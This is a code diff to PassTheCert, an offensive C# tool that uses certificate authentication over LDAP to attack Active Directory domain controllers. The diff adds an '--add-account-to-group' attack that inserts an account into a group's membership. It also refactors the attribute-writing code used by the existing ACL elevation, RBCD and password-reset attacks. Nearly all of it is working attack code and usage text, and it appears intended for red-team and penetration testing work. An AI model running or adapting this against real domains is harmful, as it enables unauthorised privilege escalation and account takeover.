@@ -1,5 +1,5 @@
-﻿// Copyright 2022 Almond (almond.consulting)
-// 
+// Copyright 2022 Almond (almond.consulting)
+//
 // Author: Yannick Méheut (ymeheut@almond.consulting)
 //
 // Accompanying blog post: https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html
@@ -160,18 +160,25 @@ namespace PassTheCert
             return sd;
         }
 
-        static void SetAttribute(LdapConnection connection, string target, string attribute, byte[] new_attribute_value)
+        static void ModifyAttribute(LdapConnection connection, string target, string attribute, byte[] new_attribute_value, bool encoded_attribute_as_string, DirectoryAttributeOperation operation)
         {
-            ModifyRequest modify_req = null;
-            if (new_attribute_value == null)
+            ModifyRequest modify_req;
+            DirectoryAttributeModification attribute_modification = new DirectoryAttributeModification { Name = attribute };
+            attribute_modification.Operation = operation;
+
+            if (new_attribute_value != null)
             {
-                modify_req = new ModifyRequest(target, DirectoryAttributeOperation.Delete, attribute);
+                if (encoded_attribute_as_string)
+                {
+                    attribute_modification.Add(System.Text.Encoding.Unicode.GetString(new_attribute_value));
+                }
+                else
+                {
+                    attribute_modification.Add(new_attribute_value);
+                }
             }
-            else
-            {
-                modify_req = new ModifyRequest(target, DirectoryAttributeOperation.Replace, attribute,
-                    new_attribute_value);
-            }
+
+            modify_req = new ModifyRequest(target, attribute_modification);
             try
             {
                 ModifyResponse mod_resp = (ModifyResponse)connection.SendRequest(modify_req);
@@ -187,6 +194,7 @@ namespace PassTheCert
         static void AclAttack(LdapConnection connection, string target, string filter, string attribute, AccessControlEntry[] new_aces, string restore_file, bool flag_control)
         {
             byte[] new_security_descriptor = null;
+            DirectoryAttributeOperation operation;
 
             if (restore_file != null)
             {
@@ -213,7 +221,16 @@ namespace PassTheCert
                 new_security_descriptor = SecurityDescriptorToByteArray(sd);
             }
 
-            SetAttribute(connection, target, attribute, new_security_descriptor);
+            if (new_security_descriptor == null)
+            {
+                operation = DirectoryAttributeOperation.Delete;
+            }
+            else
+            {
+                operation = DirectoryAttributeOperation.Replace;
+            }
+
+            ModifyAttribute(connection, target, attribute, new_security_descriptor, false, operation);
         }
 
         static void Whoami(LdapConnection connection)
@@ -317,12 +334,17 @@ namespace PassTheCert
             }
             byte[] new_password_byte = System.Text.Encoding.Unicode.GetBytes('"' + new_password + '"');
 
-            SetAttribute(connection, target, "unicodePwd", new_password_byte);
+            ModifyAttribute(connection, target, "unicodePwd", new_password_byte, false, DirectoryAttributeOperation.Replace);
+        }
+
+        static void AddAccountToGroupAttack(LdapConnection connection, string target, string account)
+        {
+            ModifyAttribute(connection, target, "member", System.Text.Encoding.Unicode.GetBytes(account), true, DirectoryAttributeOperation.Add);
         }
 
         static void PrintHelp(int exit_code)
         {
-            Console.WriteLine("PassTheCert.exe [--help] --server DOMAIN_CONTROLLER [--start-tls] --cert-path CERT_PATH [--cert-password CERT_PASSWORD] (--elevate|--rbcd|--add-computer|--reset-password) [ATTACK_OPTIONS]");
+            Console.WriteLine("PassTheCert.exe [--help] --server DOMAIN_CONTROLLER [--start-tls] --cert-path CERT_PATH [--cert-password CERT_PASSWORD] (--elevate|--rbcd|--add-computer|--reset-password|--add-account-to-group) [ATTACK_OPTIONS]");
             Console.WriteLine("GENERAL OPTIONS:");
             Console.WriteLine("\t--server DOMAIN_CONTROLLER");
             Console.WriteLine("\t\tDomain controller to connect to. By default, connection will be done over TCP/636 (LDAPS).");
@@ -344,6 +366,8 @@ namespace PassTheCert
             Console.WriteLine("\t\tAdd a new computer to the domain (useful for RBCD attacks).");
             Console.WriteLine("\t--reset-password");
             Console.WriteLine("\t\tReset the password of the targeted account (requires the User-Force-Change-Password right).");
+            Console.WriteLine("\t--add-account-to-group");
+            Console.WriteLine("\t\tAdd an account to the given group.");
             Console.WriteLine("\n");
             Console.WriteLine("ELEVATE ATTACK OPTIONS: --target TARGET (--sid SID|--restore RESTORE_FILE)");
             Console.WriteLine("\t--target TARGET");
@@ -374,6 +398,12 @@ namespace PassTheCert
             Console.WriteLine("\t\tTarget of the attack. Should be the distinguished name of the account.");
             Console.WriteLine("\t--new-password new_PASSWORD");
             Console.WriteLine("\t\tThe new password of the account (Optional argument. Default value: <random value>).");
+            Console.WriteLine("\n\n");
+            Console.WriteLine("ADD ACCOUNT TO GROUP ATTACK OPTIONS: --target TARGET --account ACCOUNT");
+            Console.WriteLine("\t--target TARGET");
+            Console.WriteLine("\t\tTarget of the attack. Should be the distinguished name of the group.");
+            Console.WriteLine("\t--account ACCOUNT");
+            Console.WriteLine("\t\tThe account added to the group. Should be the distinguished name of the account.");
             Console.WriteLine("\n\n");
             Console.WriteLine("Examples:\n");
             Console.WriteLine("PassTheCert.exe --server ad.contoso.com --cert-path C:\\exchange_server.pfx --elevate --target DC=contoso,DC=com --sid S-1-5-21-453406510-812318184-4183662089-1337");
@@ -416,6 +446,9 @@ namespace PassTheCert
             //// Parameters for reset password attack
             string new_password = null;
 
+            //// Parameters for add account to group attack
+            string account = null;
+
             for (int i = 0; i < args.Length; i++)
             {
                 switch (args[i])
@@ -453,8 +486,11 @@ namespace PassTheCert
                     case "--reset-password":
                         attack_type = "reset_password";
                         break;
+                    case "--add-account-to-group":
+                        attack_type = "add_account_to_group";
+                        break;
 
-                    // Parameters for elevate, RBCD, and reset password attacks
+                    // Parameters for elevate, RBCD, reset password, and add account to group attacks
                     case "--target":
                         target = args[i + 1];
                         break;
@@ -476,6 +512,11 @@ namespace PassTheCert
                     // Additional parameters for reset password attacks
                     case "--new-password":
                         new_password = args[i + 1];
+                        break;
+
+                    // Additional parameters for add account to group attacks
+                    case "--account":
+                        account = args[i + 1];
                         break;
                 }
             }
@@ -523,8 +564,11 @@ namespace PassTheCert
                 case "reset_password":
                     ResetPasswordAttack(connection, target, new_password);
                     break;
+                case "add_account_to_group":
+                    AddAccountToGroupAttack(connection, target, account);
+                    break;
                 default:
-                    Console.WriteLine("Attack type not supported, choose one between --elevate, --rbcd, --add-computer, and --reset-password.\n");
+                    Console.WriteLine("Attack type not supported, choose one between --elevate, --rbcd, --add-computer, --reset-password, and --add-account-to-group.\n");
                     PrintHelp(1);
                     break;
             }
